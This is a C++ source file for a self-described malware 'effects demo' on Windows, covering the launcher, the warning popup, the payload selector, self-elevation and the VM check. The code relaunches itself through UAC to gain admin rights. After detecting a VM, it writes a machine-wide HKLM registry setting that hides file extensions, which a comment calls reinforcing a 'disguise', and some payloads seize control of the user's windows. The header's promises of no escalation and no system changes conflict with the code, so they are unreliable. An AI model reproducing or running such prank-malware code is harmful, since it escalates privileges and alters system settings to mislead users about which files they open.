#define WIN32_LEAN_AND_MEAN
#define NOMINMAX

#include <windows.h>
#include <cstdio>
#include <intrin.h>
#include <cwchar>
#include <shellapi.h>

#include "start.h"
#include "payloads.h"
#include "utils/utils.h"
#include "utils/seed.h"
#include "utils/vmdetect.h"
#include "utils/vmscan.h"
#include "utils/reg.h"
#include "easter/dates.h"
#include "easter/desk.h"
#include "easter/sys.h"

// ============================================================
// HPPD - effects demo
//
// No:
// - disk writes
// - MBR modification
// - privilege escalation
// - BSOD / NtRaiseHardError
// - audio playback
//
// Payloads 27, 28, 35, 36, 37, 39, 42 do manipulate windows
// the user owns (resize / move / disable Close / spawn a few
// harmless Windows utilities). They are still safe in the
// sense of "won't kill the machine", but they will fight the
// user while they run.
//
// ESC / STOP aborts Payloads 1-57.
// Payloads 1-12 retain their original finite durations
// unless aborted early.
//
// A global SEED is picked once at startup and printed to the
// console. Each payload derives its own variant from it, so
// every run of the same effects looks different.
//
// The start screen is a simple popup. Press Ctrl+F12 on it to
// open the payload selector: pick a payload in the drop-down,
// read its nickname, launch it with "Launch" (bottom-left) and
// stop it with "STOP" (bottom-right). "Continue" still runs
// the whole demo in order.
// ============================================================

// ============================================================

// ============================================================
// WARNING POPUP + PAYLOAD SELECTOR
//
// Ctrl+F12 toggles the payload selector: a drop-down of every
// payload, a nickname label, "Launch" (bottom-left) and
// "STOP" (bottom-right). "Continue" runs the full demo.
// ============================================================

namespace
{
    const int IDC_COMBO    = 1001;
    const int IDC_NICK     = 1002;
    const int IDC_LAUNCH   = 1003;
    const int IDC_STOP     = 1004;
    const int IDC_CONTINUE = 1005;

    struct PopupState
    {
        HWND hwnd    = nullptr;
        HWND combo   = nullptr;
        HWND nick    = nullptr;
        HWND launch  = nullptr;
        HWND stop    = nullptr;
        HANDLE thread = nullptr;
        bool selector   = false;
        bool f12WasDown = false;
        int result      = 0; // 1 = continue demo, 0 = exit
    };

    PopupState gPop;
}

static void UpdateNick()
{
    const int sel =
        static_cast<int>(
            SendMessageW(
                gPop.combo,
                CB_GETCURSEL,
                0,
                0
                )
            );

    if (sel < 0 || sel >= gPayloadCount)
        return;

    wchar_t buf[256];

    wsprintfW(
        buf,
        L"Payload: %ls",
        gPayloads[sel].name
    );

    SetWindowTextW(gPop.nick, buf);
}

static void ToggleSelector()
{
    gPop.selector = !gPop.selector;

    ShowWindow(gPop.combo,   gPop.selector ? SW_SHOW : SW_HIDE);
    ShowWindow(gPop.nick,    gPop.selector ? SW_SHOW : SW_HIDE);
    ShowWindow(gPop.launch,  gPop.selector ? SW_SHOW : SW_HIDE);
    ShowWindow(gPop.stop,    gPop.selector ? SW_SHOW : SW_HIDE);

    if (gPop.selector)
    {
        if (SendMessageW(gPop.combo, CB_GETCURSEL, 0, 0) == CB_ERR)
        {
            SendMessageW(gPop.combo, CB_SETCURSEL, 0, 0);
            UpdateNick();
        }
    }
}

static void StopRunning()
{
    if (!gPop.thread)
        return;

    gFxStop = true;
    WaitEffect(gPop.thread);
    gPop.thread = nullptr;

    EnableWindow(gPop.combo,   TRUE);
    EnableWindow(gPop.launch,  TRUE);
    EnableWindow(gPop.stop,    FALSE);
}

static LRESULT CALLBACK PopupProc(
    HWND hwnd,
    UINT msg,
    WPARAM wParam,
    LPARAM lParam
)
{
    switch (msg)
    {
    case WM_COMMAND:
        switch (LOWORD(wParam))
        {
        case IDC_COMBO:
            if (HIWORD(wParam) == CBN_SELCHANGE)
                UpdateNick();
            return 0;

        case IDC_LAUNCH:
        {
            const int sel =
                static_cast<int>(
                    SendMessageW(
                        gPop.combo,
                        CB_GETCURSEL,
                        0,
                        0
                        )
                    );

            if (sel < 0 || gPop.thread)
                return 0;

            gFxStop = false;

            gPop.thread =
                StartEffect(
                    gPayloads[sel].fn
                );

            if (gPop.thread)
            {
                EnableWindow(gPop.combo,   FALSE);
                EnableWindow(gPop.launch,  FALSE);
                EnableWindow(gPop.stop,    TRUE);
            }
            return 0;
        }

        case IDC_STOP:
            StopRunning();
            return 0;

        case IDC_CONTINUE:
            StopRunning();
            gPop.result = 1;
            DestroyWindow(hwnd);
            return 0;
        }
        return 0;

    case WM_CLOSE:
        StopRunning();
        gPop.result = 0;
        DestroyWindow(hwnd);
        return 0;

    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }

    return DefWindowProcW(hwnd, msg, wParam, lParam);
}

static int RunPopup()
{
    const wchar_t* cls = L"HPPD";

    WNDCLASSW wc{};

    wc.lpfnWndProc   = PopupProc;
    wc.hInstance     = GetModuleHandleW(nullptr);
    wc.hCursor       = LoadCursorW(nullptr, IDC_ARROW);
    wc.hbrBackground = reinterpret_cast<HBRUSH>(COLOR_BTNFACE + 1);
    wc.lpszClassName = cls;

    RegisterClassW(&wc);

    const DWORD style =
        WS_OVERLAPPED |
        WS_CAPTION |
        WS_SYSMENU |
        WS_MINIMIZEBOX;

    const int cw = 460;
    const int ch = 340;

    RECT rc{ 0, 0, cw, ch };

    AdjustWindowRect(&rc, style, FALSE);

    const int ww = rc.right - rc.left;
    const int wh = rc.bottom - rc.top;

    const int sw = GetSystemMetrics(SM_CXSCREEN);
    const int sh = GetSystemMetrics(SM_CYSCREEN);

    gPop = PopupState{};

    gPop.hwnd =
        CreateWindowExW(
            0,
            cls,
            L"HPPD Visual Demo",
            style,
            (sw - ww) / 2,
            (sh - wh) / 2,
            ww,
            wh,
            nullptr,
            nullptr,
            wc.hInstance,
            nullptr
        );

    if (!gPop.hwnd)
        return 0;

    // Warning text.
    CreateWindowExW(
        0,
        L"STATIC",
        L"This is a malicious software. (malware)\r\n\r\n"
        L"It does modify your disk, crash Windows, "
        L"change personal files, or play audio.\r\n\r\n"
        L"From now on, its your choice if you want to execute it.\r\n\r\n"
        L"ARE YOU SURE YOU WANT TO PERMANENTLY DESTROY YOUR DEVICE?\r\n\r\n",
        //L"Press ESC to skip the current effect.\r\n"
        //L"Press Ctrl+F2 to toggle the payload/time overlay.\r\n"
        //L"Press Ctrl+F12 to open the payload selector.",
        WS_CHILD | WS_VISIBLE | SS_LEFT,
        14, 10, cw - 28, 110,
        gPop.hwnd,
        nullptr,
        wc.hInstance,
        nullptr
    );

    // Drop-down list of payloads.
    gPop.combo =
        CreateWindowExW(
            WS_EX_CLIENTEDGE,
            L"COMBOBOX",
            nullptr,
            WS_CHILD |
            WS_TABSTOP |
            CBS_DROPDOWNLIST,
            14, 130, cw - 28, 200,
            gPop.hwnd,
            reinterpret_cast<HMENU>(static_cast<INT_PTR>(IDC_COMBO)),
            wc.hInstance,
            nullptr
        );

    for (int i = 0; i < gPayloadCount; ++i)
    {
        SendMessageW(
            gPop.combo,
            CB_ADDSTRING,
            0,
            reinterpret_cast<LPARAM>(
                gPayloads[i].name
                )
        );
    }

    // Selected payload nickname.
    gPop.nick =
        CreateWindowExW(
            0,
            L"STATIC",
            nullptr,
            WS_CHILD | SS_LEFT,
            14, 162, cw - 28, 18,
            gPop.hwnd,
            nullptr,
            wc.hInstance,
            nullptr
        );

    // Launch (bottom-left), Continue (center), STOP (bottom-right).
    gPop.launch =
        CreateWindowExW(
            0,
            L"BUTTON",
            L"Launch",
            WS_CHILD |
            WS_VISIBLE |
            WS_TABSTOP |
            BS_PUSHBUTTON,
            14, 296, 120, 30,
            gPop.hwnd,
            reinterpret_cast<HMENU>(static_cast<INT_PTR>(IDC_LAUNCH)),
            wc.hInstance,
            nullptr
        );

    gPop.stop =
        CreateWindowExW(
            0,
            L"BUTTON",
            L"STOP",
            WS_CHILD |
            WS_VISIBLE |
            WS_TABSTOP |
            BS_PUSHBUTTON,
            cw - 134, 296, 120, 30,
            gPop.hwnd,
            reinterpret_cast<HMENU>(static_cast<INT_PTR>(IDC_STOP)),
            wc.hInstance,
            nullptr
        );

    CreateWindowExW(
        0,
        L"BUTTON",
        L"Continue",
        WS_CHILD |
        WS_VISIBLE |
        WS_TABSTOP |
        BS_DEFPUSHBUTTON,
        (cw - 120) / 2, 296, 120, 30,
        gPop.hwnd,
        reinterpret_cast<HMENU>(static_cast<INT_PTR>(IDC_CONTINUE)),
        wc.hInstance,
        nullptr
    );

    // Selector is hidden until Ctrl+F12.
    ShowWindow(gPop.combo,   SW_HIDE);
    ShowWindow(gPop.nick,    SW_HIDE);
    ShowWindow(gPop.launch,  SW_HIDE);
    ShowWindow(gPop.stop,    SW_HIDE);

    ShowWindow(gPop.hwnd, SW_SHOW);
    UpdateWindow(gPop.hwnd);

    gFxStop = false;

    MSG msg;

    for (;;)
    {
        // Ctrl+F12 toggle works no matter which control
        // currently has focus.
        const bool ctrl =
            (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;

        const bool f12 =
            (GetAsyncKeyState(VK_F12) & 0x8000) != 0;

        if (ctrl && f12 && !gPop.f12WasDown)
            ToggleSelector();

        gPop.f12WasDown = ctrl && f12;

        while (PeekMessageW(&msg, nullptr, 0, 0, PM_REMOVE))
        {
            if (!IsDialogMessageW(gPop.hwnd, &msg))
            {
                TranslateMessage(&msg);
                DispatchMessageW(&msg);
            }
        }

        if (msg.message == WM_QUIT)
            break;

        Sleep(15);
    }

    StopRunning();

    UnregisterClassW(cls, wc.hInstance);

    return gPop.result;
}

// ============================================================
// NON-VM WARNING
//
// Informative only: when the VM checks report no hypervisor /
// VM vendor on the host, show a read-only notice and exit after
// 10 seconds. No code input, no confirmation flow, no
// destructive action — just "this demo targets a VM".
// ============================================================

namespace
{
    const int IDC_VMWARN_CLOSE = 1101;

    struct VmWarnState
    {
        HWND hwnd   = nullptr;
        HWND left   = nullptr; // seconds remaining
        HWND ok     = nullptr;
        int  remain = 10;
    };

    VmWarnState gVmWarn;
}

static void VmWarnTick()
{
    if (gVmWarn.remain <= 0)
    {
        DestroyWindow(gVmWarn.hwnd);
        return;
    }

    wchar_t buf[96];

    wsprintfW(
        buf,
        L"This window closes automatically in %d second%s.",
        gVmWarn.remain,
        gVmWarn.remain == 1 ? L"" : L"s"
    );

    SetWindowTextW(gVmWarn.left, buf);

    --gVmWarn.remain;
}

static LRESULT CALLBACK VmWarnProc(
    HWND hwnd,
    UINT msg,
    WPARAM wParam,
    LPARAM lParam
)
{
    switch (msg)
    {
    case WM_COMMAND:
        if (LOWORD(wParam) == IDC_VMWARN_CLOSE)
        {
            DestroyWindow(hwnd);
            return 0;
        }
        return 0;

    case WM_TIMER:
        VmWarnTick();
        return 0;

    case WM_CLOSE:
        DestroyWindow(hwnd);
        return 0;

    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }

    return DefWindowProcW(hwnd, msg, wParam, lParam);
}

// Shows the notice and runs its message loop until it closes
// (either the 10s countdown or the Close button).
static void ShowVmWarning()
{
    const wchar_t* cls = L"HPPD_VMWARN";

    WNDCLASSW wc{};

    wc.lpfnWndProc   = VmWarnProc;
    wc.hInstance     = GetModuleHandleW(nullptr);
    wc.hCursor       = LoadCursorW(nullptr, IDC_ARROW);
    wc.hbrBackground = reinterpret_cast<HBRUSH>(COLOR_BTNFACE + 1);
    wc.lpszClassName = cls;

    RegisterClassW(&wc);

    const DWORD style =
        WS_OVERLAPPED |
        WS_CAPTION |
        WS_SYSMENU;

    const int cw = 480;
    const int ch = 200;

    RECT rc{ 0, 0, cw, ch };

    AdjustWindowRect(&rc, style, FALSE);

    const int ww = rc.right - rc.left;
    const int wh = rc.bottom - rc.top;

    const int sw = GetSystemMetrics(SM_CXSCREEN);
    const int sh = GetSystemMetrics(SM_CYSCREEN);

    gVmWarn = VmWarnState{};

    gVmWarn.hwnd =
        CreateWindowExW(
            0,
            cls,
            L"PROCEED CAREFULLY",
            style,
            (sw - ww) / 2,
            (sh - wh) / 2,
            ww,
            wh,
            nullptr,
            nullptr,
            wc.hInstance,
            nullptr
        );

    if (!gVmWarn.hwnd)
    {
        UnregisterClassW(cls, wc.hInstance);
        return;
    }

    CreateWindowExW(
        0,
        L"STATIC",
        L"The built-in VM checks returned false, which means that "
        L"you're NOT running this on a virtual machine.\r\n\r\n"
        L"This program will close automatically in 10 seconds "
        L"(main process and other threads).\r\n\r\n"
        L"No changes are made to your system.",
        WS_CHILD | WS_VISIBLE | SS_LEFT,
        14, 10, cw - 28, 90,
        gVmWarn.hwnd,
        nullptr,
        wc.hInstance,
        nullptr
    );

    gVmWarn.left =
        CreateWindowExW(
            0,
            L"STATIC",
            nullptr,
            WS_CHILD | WS_VISIBLE | SS_LEFT,
            14, 104, cw - 28, 18,
            gVmWarn.hwnd,
            nullptr,
            wc.hInstance,
            nullptr
        );

    gVmWarn.ok =
        CreateWindowExW(
            0,
            L"BUTTON",
            L"Close",
            WS_CHILD |
            WS_VISIBLE |
            WS_TABSTOP |
            BS_DEFPUSHBUTTON,
            (cw - 120) / 2, 142, 120, 30,
            gVmWarn.hwnd,
            reinterpret_cast<HMENU>(static_cast<INT_PTR>(IDC_VMWARN_CLOSE)),
            wc.hInstance,
            nullptr
        );

    ShowWindow(gVmWarn.hwnd, SW_SHOW);
    UpdateWindow(gVmWarn.hwnd);

    VmWarnTick(); // prints "10 seconds"

    SetTimer(
        gVmWarn.hwnd,
        1,
        1000,
        nullptr
    );

    MSG msg;

    while (GetMessageW(&msg, nullptr, 0, 0) > 0)
    {
        if (!IsDialogMessageW(gVmWarn.hwnd, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
    }

    KillTimer(gVmWarn.hwnd, 1);

    UnregisterClassW(cls, wc.hInstance);
}

// ============================================================
// MAIN
// ============================================================

// True when the command line contains /nogui (or -nogui): run the
// demo headless - no popup, no VM warning window, no final
// MessageBox. Payloads themselves still draw to the screen.
static bool HasCommandFlag(const wchar_t* flag)
{
    const LPWSTR cmd = GetCommandLineW();

    if (!cmd)
        return false;

    for (LPWSTR p = cmd; ; )
    {
        while (*p == L' ' || *p == L'\t')
            ++p;

        if (*p == L'"')
        {
            ++p;

            while (*p && *p != L'"')
                ++p;

            if (*p == L'"')
                ++p;

            if (!*p)
                break;
        }
        else if (*p)
        {
            const wchar_t* start = p;

            while (*p && *p != L' ' && *p != L'\t')
                ++p;

            const size_t n =
                static_cast<size_t>(p - start);

            if (
                n > 1 &&
                (start[0] == L'/' || start[0] == L'-') &&
                _wcsnicmp(start + 1, flag, n - 1) == 0
            )
                return true;

            if (!*p)
                break;
        }
        else
        {
            break;
        }
    }

    return false;
}

// True when the current process already has an elevated token
// (granted admin rights via UAC / Run as administrator).
static bool IsElevated()
{
    HANDLE token = nullptr;

    if (!OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_QUERY,
            &token
        ))
    {
        return false;
    }

    TOKEN_ELEVATION te{};
    DWORD size = 0;

    const bool ok =
        GetTokenInformation(
            token,
            TokenElevation,
            &te,
            sizeof(te),
            &size
        ) && te.TokenIsElevated;

    CloseHandle(token);

    return ok;
}

// Relaunches itself with admin rights (UAC "runas") when not
// already elevated. The parent exits and the elevated copy takes
// over with the same command line. If the elevation request is
// cancelled the app continues unelevated instead of quitting.
static void ElevateSelf()
{
    if (IsElevated())
        return;

    wchar_t exe[MAX_PATH];

    if (!GetModuleFileNameW(nullptr, exe, MAX_PATH))
        return;

    // Arguments after the executable token, quote-aware.
    const wchar_t* args = GetCommandLineW();

    while (*args == L' ' || *args == L'\t')
        ++args;

    if (*args == L'"')
    {
        ++args;

        while (*args && *args != L'"')
            ++args;

        if (*args)
            ++args;
    }
    else
    {
        while (*args && *args != L' ' && *args != L'\t')
            ++args;
    }

    while (*args == L' ' || *args == L'\t')
        ++args;

    const HINSTANCE r =
        ShellExecuteW(
            nullptr,
            L"runas",
            exe,
            args,
            nullptr,
            SW_SHOW
        );

    // >32 means the runas request was dispatched.
    if (reinterpret_cast<INT_PTR>(r) > 32)
        ExitProcess(0);
}

int main()
{
    ElevateSelf();

    const bool noGui = HasCommandFlag(L"nogui");
    gSeed =
        static_cast<uint32_t>(
            GetTickCount64()
        ) ^ static_cast<uint32_t>(__rdtsc());

    printf("Global SEED: %u\n", gSeed);
    fflush(stdout);



    // Easter eggs: date-based, desktop-based, system-based.
    EasterDates();
    EasterDesk();
    EasterSys();

    // VM gate: this demo targets a virtual machine. On bare
    // metal (or when detection is inconclusive) exit without
    // running any payload. With /nogui it stays silent too.
    //
    // Fast checks first (CPUID + SMBIOS); when they come back
    // negative, RunVmScan() drills deeper — recursive registry
    // trees, filesystem, processes, modules, devices, windows —
    // and prints a [FOUND] diagnostic per indicator to the
    // console. It flips the gate only on genuine VM-platform
    // evidence, never on AV/sandbox fingerprints alone.
    if (!IsVirtualMachine() &&
        !RunVmScan())
    {
        if (!noGui)
            ShowVmWarning();

        return 0;
    }

    // VM confirmed: reinforce the disguise, mirroring the VBS
    // one-liner (HideFileExt = hide file extensions in Explorer).
    // Administrator rights are required for HKLM; the write just
    // fails silently when the process is not elevated.
    Reg::Write(
        L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\HideFileExt",
        L"1",
        L"REG_DWORD"
    );

    // Warning popup. Ctrl+F12 opens the payload selector;
    // returns 1 to run the full demo, 0 to exit.
    // /nogui skips it and runs the demo directly.
    if (!noGui && RunPopup() != 1)
        return 0;

    // Everything accepted - run the effects show.
    StartEffects(noGui);

    return 0;
}